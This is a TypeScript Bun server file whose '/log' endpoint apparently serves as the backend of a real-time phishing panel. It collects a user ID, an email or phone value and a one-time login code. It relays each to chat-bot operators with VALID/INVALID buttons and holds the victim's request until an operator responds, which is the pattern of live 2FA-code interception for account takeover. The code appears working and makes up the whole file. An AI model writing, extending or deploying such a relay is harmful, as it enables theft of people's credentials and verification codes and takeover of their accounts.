import { serve } from "bun";
import chalk from "chalk";
import { eq } from "drizzle-orm";
import z from "zod";
import { env } from "./env";
import {
  waitForLoginAttempt,
  waitForMethodAttempt,
  waitForVerifyAttempt,
} from "./lib/bot/callback-bus";
import { CallbackDataType } from "./lib/bot/constants";
import { sendMessageToAllSessions } from "./lib/bot/utils";
import { formatLoginAttemptMethod } from "./lib/bot/utils/format-login-attempt-method";
import { cors, withCors } from "./lib/cors";
import { db } from "./lib/db/db";
import { tables } from "./lib/db/schemas";
import { saveAllMessages } from "./lib/db/utils";
import type { LoginAttemptMethod, VerifyAttemptStatus } from "./types";

require("@/lib/bot/bot");

const server = serve({
  routes: {
    "/health": {
      GET: () => Response.json({ status: "ok" }),
    },
    "/log": {
      async POST(req) {
        //#region PRE-PROCESSING
        const baseSchema = z.object({
          userId: z.string(),
          loginAttemptId: z.string().optional(),
          loginAttemptCode: z.string().optional(),
        });

        const body = await req.json();
        const basePayload = baseSchema.safeParse(body);

        if (!basePayload.success) {
          return withCors(
            Response.json(
              { error: z.treeifyError(basePayload.error) },
              { status: 400 },
            ),
          );
        }
        //#endregion

        //#region STEP 3: LOGIN ATTEMPT CODE
        if (basePayload.data.loginAttemptCode) {
          const step3Schema = z.object({
            loginAttemptId: z.string(),
            loginAttemptMethod: z.enum(["email", "phone"]),
            loginAttemptValue: z.string(),
          });

          const step3Payload = step3Schema.safeParse(body);

          if (!step3Payload.success) {
            return withCors(
              Response.json(
                { error: z.treeifyError(step3Payload.error) },
                { status: 400 },
              ),
            );
          }

          const [loginAttempt] = await db
            .select()
            .from(tables.loginAttempt)
            .where(
              eq(tables.loginAttempt.id, step3Payload.data.loginAttemptId),
            );

          if (!loginAttempt) {
            return withCors(
              Response.json(
                { error: "Login attempt not found" },
                { status: 404 },
              ),
            );
          }

          const messages = await sendMessageToAllSessions(
            `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
              `<b>🔒 METHOD:</b> ${formatLoginAttemptMethod(step3Payload.data.loginAttemptMethod)}\n` +
              `<b>🔑 VALUE:</b> <code>${step3Payload.data.loginAttemptValue}</code>\n` +
              `<b>🔐 CODE:</b> <code>${basePayload.data.loginAttemptCode}</code>`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ VALID",
                      callback_data: `${CallbackDataType.VerifyAttempt}:${loginAttempt.id}:valid`,
                    },
                    {
                      text: "❌ INVALID",
                      callback_data: `${CallbackDataType.VerifyAttempt}:${loginAttempt.id}:invalid`,
                    },
                  ],
                ],
              },
            },
          );

          await saveAllMessages(
            messages
              .filter((message) => message.status === "fulfilled")
              .map((message) => message.value)
              .filter((message) => message != null),
            loginAttempt.id,
          );

          try {
            const verifyAttemptStatus =
              await waitForVerifyAttempt<VerifyAttemptStatus>(loginAttempt.id);

            if (verifyAttemptStatus.data === "valid") {
              return withCors(Response.json(loginAttempt));
            } else {
              return withCors(
                Response.json(
                  { error: "Verify attempt failed" },
                  { status: 400 },
                ),
              );
            }
          } catch {
            return withCors(
              Response.json(
                { error: "Verify attempt callback timed out" },
                { status: 504 },
              ),
            );
          }
        }
        //#endregion

        //#region STEP 2: LOGIN ATTEMPT CONTINUE
        if (basePayload.data.loginAttemptId) {
          const step2Schema = z.object({
            loginAttemptMethod: z.enum(["email", "phone"]),
            loginAttemptValue: z.string(),
          });

          const step2Payload = step2Schema.safeParse(body);

          if (!step2Payload.success) {
            return withCors(
              Response.json(
                { error: z.treeifyError(step2Payload.error) },
                { status: 400 },
              ),
            );
          }

          const [loginAttempt] = await db
            .select()
            .from(tables.loginAttempt)
            .where(eq(tables.loginAttempt.id, basePayload.data.loginAttemptId));

          if (!loginAttempt) {
            return withCors(
              Response.json(
                { error: "Login attempt not found" },
                { status: 404 },
              ),
            );
          }

          await db
            .update(tables.loginAttempt)
            .set({
              method: step2Payload.data.loginAttemptMethod,
              value: step2Payload.data.loginAttemptValue,
            })
            .where(eq(tables.loginAttempt.id, loginAttempt.id));

          const messages = await sendMessageToAllSessions(
            `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
              `<b>🔒 METHOD:</b> ${formatLoginAttemptMethod(step2Payload.data.loginAttemptMethod)}\n` +
              `<b>🔑 VALUE:</b> <code>${step2Payload.data.loginAttemptValue}</code>`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "➡️ CONTINUE",
                      callback_data: `${CallbackDataType.LoginAttempt}:${loginAttempt.id}`,
                    },
                  ],
                ],
              },
            },
          );

          await saveAllMessages(
            messages
              .filter((message) => message.status === "fulfilled")
              .map((message) => message.value)
              .filter((message) => message != null),
            loginAttempt.id,
          );

          try {
            await waitForLoginAttempt(loginAttempt.id);
            return withCors(Response.json(loginAttempt));
          } catch {
            return withCors(
              Response.json(
                { error: "Login attempt callback timed out" },
                { status: 504 },
              ),
            );
          }
        }
        //#endregion

        //#region STEP 1: CREATE LOGIN ATTEMPT
        {
          const userId = basePayload.data.userId.trim();

          const [inserted] = await db
            .insert(tables.user)
            .values({ id: userId })
            .onConflictDoNothing()
            .returning();

          const [user] = inserted
            ? [inserted]
            : await db
                .select()
                .from(tables.user)
                .where(eq(tables.user.id, userId));

          if (!user) {
            return withCors(
              Response.json({ error: "User not found" }, { status: 404 }),
            );
          }

          const [loginAttempt] = await db
            .insert(tables.loginAttempt)
            .values({
              id: Bun.randomUUIDv7(),
              userId: user.id,
            })
            .returning();

          if (!loginAttempt) {
            return withCors(
              Response.json(
                { error: "Failed to create login attempt" },
                { status: 500 },
              ),
            );
          }

          const messages = await sendMessageToAllSessions(
            `🔑 Login attempt from user <code>${loginAttempt.userId}</code>`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✉️ EMAIL",
                      callback_data: `${CallbackDataType.MethodAttempt}:${loginAttempt.id}:email`,
                    },
                    {
                      text: "📱 SMS",
                      callback_data: `${CallbackDataType.MethodAttempt}:${loginAttempt.id}:phone`,
                    },
                  ],
                ],
              },
            },
          );

          await saveAllMessages(
            messages
              .filter((message) => message.status === "fulfilled")
              .map((message) => message.value)
              .filter((message) => message != null),
            loginAttempt.id,
          );

          try {
            const methodAttempt =
              await waitForMethodAttempt<LoginAttemptMethod>(loginAttempt.id);

            return withCors(
              Response.json({
                ...loginAttempt,
                disabled: user.disabled,
                method: methodAttempt.data,
              }),
            );
          } catch {
            return withCors(
              Response.json(
                { error: "Method attempt callback timed out" },
                { status: 504 },
              ),
            );
          }
        }
        //#endregion
      },
      OPTIONS: () => cors(),
    },
    "/user/:id": {
      async GET(req) {
        const { id } = req.params;

        const [user] = await db
          .select()
          .from(tables.user)
          .where(eq(tables.user.id, id));

        if (!user) {
          return withCors(
            Response.json({ error: "User not found" }, { status: 404 }),
          );
        }

        return withCors(Response.json(user));
      },
      OPTIONS: () => cors(),
    },
  },

  port: env.PORT,

  development: env.NODE_ENV !== "production" && {
    hmr: true,
    console: true,
  },
});

console.log(chalk.green(`🚀 Server running at ${server.url}`));
